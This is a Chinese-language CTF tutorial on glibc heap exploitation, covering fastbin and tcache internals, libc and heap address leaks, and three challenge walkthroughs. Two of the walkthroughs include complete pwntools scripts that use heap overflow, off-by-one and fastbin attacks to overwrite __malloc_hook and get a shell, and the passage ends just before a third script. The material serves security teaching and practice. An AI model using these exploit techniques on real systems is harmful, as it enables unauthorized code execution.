<h5 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h5><h6 id="size"><a href="#size" class="headerlink" title="size"></a>size</h6><p>在malloc()函数分配fastbin size范围的chunk时，若是对应的fastbin中有空闲chunk，在取出前会检查其size域与对应下标是否一致，<strong>不会检查标志位</strong>，若否则会触发abort</p>
<h6 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h6><p>在free()函数中会对fastbin链表的<strong>头结点</strong>进行检查，若传入free()的chunk处在fastbin size范围内，其<strong>与对应下标的链表的头结点为同一chunk，则会触发abort</strong></p>
<h4 id="②tcache（only-libc2-26-and-up）"><a href="#②tcache（only-libc2-26-and-up）" class="headerlink" title="②tcache（only libc2.26 and up）"></a>②tcache（only libc2.26 and up）</h4><p>Thread Cache(tcache)机制用以快速存取chunk，使用一个结构体进行管理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p>tcache中一共有64个entries，每个entries使用如下结构体进行管理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>即tcache中的chunk使用fd域连接，并使用bk域保存tcache key</p>
<p>与普通的bin所不同的是，tcache中空闲chunk的fd域指向的并非是下一个chunk的prev_size域，仍是fd域</p>
<h5 id="安全检查-1"><a href="#安全检查-1" class="headerlink" title="安全检查"></a>安全检查</h5><p>tcache机制刚出来时基本上是毫无保护的，因此对于tcache的利用比以往要简单得多（比如说可以直接double free、任意地址写等</p>
<h6 id="tcache-key（only-libc2-29-and-up）"><a href="#tcache-key（only-libc2-29-and-up）" class="headerlink" title="tcache key（only libc2.29 and up）"></a>tcache key（only libc2.29 and up）</h6><p>自glibc2.29版本起tcache新增了一个key字段，该字段位于chunk的bk字段，值为tcache结构体的地址，若free()检测到chunk-&gt;bk == tcache则会遍历tcache对应链表中是否有该chunk</p>
<h4 id="③unsorted-bin"><a href="#③unsorted-bin" class="headerlink" title="③unsorted bin"></a>③unsorted bin</h4><p>用以临时存放堆块的bin，size大于fastbin范围、tcache链表已满（如果有tcache）时一个chunk在free之后则会先被放入unsorted bin中</p>
<p>若被放入unsorted bin中的chunk与原有chunk物理相邻则会合并成一个大chunk</p>
<h4 id="④small-bin"><a href="#④small-bin" class="headerlink" title="④small bin"></a>④small bin</h4><p>存放size较小的空闲chunk的bin</p>
<h4 id="⑤large-bin"><a href="#⑤large-bin" class="headerlink" title="⑤large bin"></a>⑤large bin</h4><p>存放size较大的空闲chunk的bin</p>
<h2 id="0x03-基础的利用方式"><a href="#0x03-基础的利用方式" class="headerlink" title="0x03.基础的利用方式"></a>0x03.基础的利用方式</h2><h3 id="一、地址泄露"><a href="#一、地址泄露" class="headerlink" title="一、地址泄露"></a>一、地址泄露</h3><p>与ret2libc相同，CTF的堆题中往往不会直接给我们后门函数，同时地址随机化保护往往也都是开着的（准确地说，几乎所有的堆题都是<strong>保  护  全  开</strong>），故我们仍然需要利用libc中的gadget以获得flag</p>
<h4 id="bins-libc基址"><a href="#bins-libc基址" class="headerlink" title="bins - libc基址"></a>bins - libc基址</h4><p>（除fastbin以外）bins与空闲chunk间构成双向链表结构，利用这个特性我们便可以泄漏出main_arena的地址，进而泄漏出libc的基址</p>
<p>gdb调试可以方便我们知道chunk上所记载的与main_arena间的偏移</p>
<p>通常情况下，我们利用unsorted bin中的chunk泄露libc地址，其与main_arena间距离为0x58/0x60(libc2.26 and up， with tcache)，而main_arena与__malloc_hook间地址相差0x10，故有如下板子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main_arena = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x60</span> <span class="comment"># tcache</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="tcache-key-堆基址（only-libc2-29-and-up）"><a href="#tcache-key-堆基址（only-libc2-29-and-up）" class="headerlink" title="tcache key - 堆基址（only libc2.29 and up）"></a>tcache key - 堆基址（only libc2.29 and up）</h4><p>tcache key所用的值便是tcache结构体本身的地址，故若我们能够打印tcache key，就能直接获得堆基址</p>
<p>有如下板子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">heap_base = heap_leak - <span class="number">0x290</span> - <span class="number">0x10</span> <span class="comment"># C</span></span><br><span class="line">heap_base = heap_leak - <span class="number">0x11c10</span> - <span class="number">0x290</span> - <span class="number">0x10</span> <span class="comment"># C++ with string</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是不同版本的libc下这个偏移（0x290，libc2.31 cover）并不一定是相同的，还需要读者自行使用gdb进行调试</p>
<h3 id="二、堆溢出"><a href="#二、堆溢出" class="headerlink" title="二、堆溢出"></a>二、堆溢出</h3><p>堆溢出通常指的是在程序读取输入到堆块上时，未经严格的检测（如使用gets()读入），导致用户输入的数据可以溢出到其物理相邻高地址的chunk，从而改写其结构，予攻击者以无限的利用空间</p>
<h5 id="例题：babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#例题：babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="例题：babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget"></a>例题：babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</h5><p>惯例的<code>checksec</code>，发现<strong>保  护  全  开</strong>（<strong>心 肺 停 止</strong></p>
<p><img src="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png" alt="image.png"></p>
<p>拖入IDA里进行分析（以下部分函数、变量名经过重命名）</p>
<p>常见的堆题基本上都是菜单题，本题也不例外<img src="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png" alt="image.png"></p>
<p>我们可以发现在<code>writeHeap()</code>函数中并没有对我们输入的长度进行检查，<strong>存在堆溢出</strong></p>
<p><img src="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png" alt="image.png"></p>
<p>故我们考虑先创建几个小堆块，再创建一个大堆块，free掉两个小堆块进入到fastbin，用堆溢出改写fastbin第一个块的fd指针为我们所申请的大堆块的地址，需要注意的是fastbin会对chunk的size进行检查，故我们还需要先通过堆溢出改写大堆块的size，之后将大堆块分配回来后我们就有两个指针指向同一个堆块</p>
<p><img src="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png" alt="62DB8B2E56B87418664EEB947A980782.png"></p>
<p>利用堆溢出将大堆块的size重新改大再free以送入unsorted bin，此时大堆块的fd与bk指针指向main_arena+0x58的位置，利用另外一个指向该大堆块的指针输出fd的内容即可得到main_arena+0x58的地址，就可以算出libc的基址</p>
<p><img src="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png" alt="72934A2F942430E796048F09C96A261F.png"></p>
<p>接下来便是fastbin attack：将某个堆块送入fastbin后改写其fd指针为__malloc_hook的地址（__malloc_hook位于main_arena上方0x10字节处），再将该堆块分配回来，此时fastbin中该链表上就会存在一个我们所伪造的位于__malloc_hook上的堆块，申请这个堆块后我们便可以改写malloc_hook上的内容为后门函数地址，最后随便分配一个堆块便可getshell</p>
<p>考虑到题目中并不存在可以直接getshell的后门函数，故考虑使用one_gadget以getshell</p>
<p><img src="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png" alt="D2D612904D8AB28F1DCCE651D4B81508.png"></p>
<p>需要注意的是fastbin存在size检查，故在这里我们选择在__malloc_hook - 0x23的位置构造fake chunk（size字段为0x7f刚好能够通过malloc(0x60)的size检查）</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27143</span>)<span class="comment">#process('./babyheap_0ctf_2017')#</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index:int,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本即可get shell</p>
<p><img src="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png" alt="image.png"></p>
<h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h4><p>off by one通常指的是对于堆块的读写存在一个字节的溢出，利用这一个字节的溢出我们可以溢出到一个chunk物理相邻高地址chunk的size位，篡改其size以便后续的利用</p>
<h5 id="例题：-V-amp-N2020-公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#例题：-V-amp-N2020-公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="例题：[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget"></a>例题：[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget</h5><p>又是一道堆题来了，不出所料，保  护  全  开</p>
<p><img src="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png" alt="image.png"></p>
<p>同时题目提示Ubuntu16，也就是说没有tcache</p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png" alt="image.png"></p>
<p>这是一道有着分配、打印、释放、编辑堆块的功能的堆题，不难看出我们只能分配10个堆块，不过没有tcache的情况下，空间其实还是挺充足的                                                                                                                   </p>
<p>漏洞点在edit函数中，<strong>会多读入一个字节，存在off by one漏洞</strong>，利用这个漏洞我们可以<strong>修改一个堆块的物理相邻的下一个堆块的size</strong></p>
<p><img src="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png" alt="image.png"></p>
<p>由于题目本身仅允许分配大小小于111的chunk，而进入unsorted bin需要malloc(0x80)的chunk，故我们还是考虑利用off by one的漏洞改大一个chunk的size送入unsorted bin后分割造成overlapping的方式获得libc的地址</p>
<p><img src="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png" alt="image.png"></p>
<p>因为刚好fastbin attack所用的chunk的size为0x71，故我们将这个大chunk的size改为<code>0x70 + 0x70 + 1 = 0xe1</code>即可</p>
<p>传统思路是将__malloc_hook改为one_gadget以getshell，但是直接尝试我们会发现根本无法getshell</p>
<p><img src="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png" alt="image.png"></p>
<p>这是因为one_gadget并非任何时候都是通用的，都有一定的先决条件，而当前的环境刚好不满足one_gadget的环境</p>
<p><img src="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png" alt="image.png"></p>
<p>那么这里我们可以尝试使用realloc函数中的gadget来进行压栈等操作来满足one_gadget的要求，该段gadget执行完毕后会跳转至__realloc_hook（若不为NULL）</p>
<p><img src="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png" alt="image.png"></p>
<p>而__realloc_hook和__malloc_hook刚好是挨着的，我们在fastbin attack时可以一并修改</p>
<p><img src="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png" alt="image.png"></p>
<p>故考虑修改__malloc_hook跳转至realloc函数开头的gadget调整堆栈，修改__realloc_hook为one_gadget即可getshell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28978</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"choice: "</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"size?"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># initialize chunk</span></span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 3, prevent the top chunk consolidation</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># off by one get the unsorted bin chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b'A'</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b'\xe1'</span>) <span class="comment"># 0x70 + 0x70 + 1</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">"libc addr: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping and fastbin double free</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 4, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk overwrite __realloc_hook</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b'A'</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">'__libc_realloc'</span>] + <span class="number">0x10</span>)) <span class="comment"># idx 5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png" alt="image.png"></p>
<h4 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h4><p>off by null则是off by one的一种特殊形式，即仅溢出一个<code>&#39;\0&#39;</code>字节，通常出现于读入字符串时设计逻辑失误的情况</p>
<p>比起off by one，该种漏洞限制了溢出的一个字节为<code>&#39;\0&#39;</code>，极大地限制了我们的利用</p>
<h5 id="例题：LCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget"><a href="#例题：LCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget" class="headerlink" title="例题：LCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget"></a>例题：LCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget</h5><p><a href="/download/lctf2018/easy_heap">点击下载-easy_heap</a></p>
<p><a href="/download/lctf2018/libc64.so">点击下载-libc64.so</a></p>
<p>惯例的<code>checksec</code>分析，保护全开</p>
<p><img src="https://i.loli.net/2020/11/16/W2j7nlNHPq5rM9x.png" alt="image.png"></p>
<p>拖入IDA进行分析（部分函数及变量经过重命名</p>
<p><img src="https://i.loli.net/2020/11/16/jIc81hvM6mXdEa5.png" alt="image.png"></p>
<p>果不其然，传统的CTF签到题都是堆题，LCTF2018也不例外</p>
<p>我们可以看到程序本身<strong>仅会分配大小为</strong><code>0xF8</code>的堆块</p>
<p><img src="https://i.loli.net/2020/11/16/a9BSzldOX1gGQR3.png" alt="image.png"></p>
<p>同时本题只允许我们分配10个堆块，在需要用7个来填满tcache的前提下， 可用空间属实有一丶丶紧张</p>
<p><img src="https://i.loli.net/2020/11/16/WjvhU3xuMOHtXE8.png" alt="image.png"></p>
<p>漏洞点存在于读入输入时，会将当前chunk的*(ptr + size)置0</p>
<p><img src="https://i.loli.net/2020/11/16/4cAr58VdzIm3us2.png" alt="image.png"></p>
<p>我们不难想到，若是我们输入的size为<code>0xf8</code>，则有机会将下一个<strong>物理相邻chunk的PREV_INUSE域覆盖为0</strong>，即<strong>存在off by null漏洞</strong></p>
<blockquote>
<p>248 = 16*15 + 8</p>
</blockquote>
<p>通过off by null漏洞我们便可以实现堆块的重叠（overlap）：在tcache有六个chunk、我们手上有地址连续的三个chunk：A、B、C的情况下，先free掉B，送入tcache中保护起来，free掉A送入tcache，再malloc回B，<strong>覆写C的PREV_IN_USE为0，之后free掉C，触发malloc_consolidate，合并成为一个0x300的大chunk</strong>，实现<strong>overlapping</strong></p>
<p>之后倒空tcache，再分配一个chunk，便会分割unsorted bin里的大chunk，此时unsorted bin里的chunk与此前的chunk B重叠，<strong>输出chunk B的内容便能获得libc基址</strong></p>
<p>再分配一个chunk以得到指向相同位置上的堆块的索引，<strong>在这里构造tcache poisoning覆写__malloc_hook为one_gadget后随便分配一个chunk即可getshell</strong></p>
<p>需要注意的是在释放堆块的功能函数中在free前会先清空堆块内容，故在这里无法通过修改__free_hook为system后free(“/bin/sh”)的方法来getshell，因此笔者只好选择攻击__malloc_hook</p>
<p><img src="https://i.loli.net/2021/01/20/Za2wEpFAUu4mN7Q.png" alt=""></p>
<p>故构造exp如下：</p>
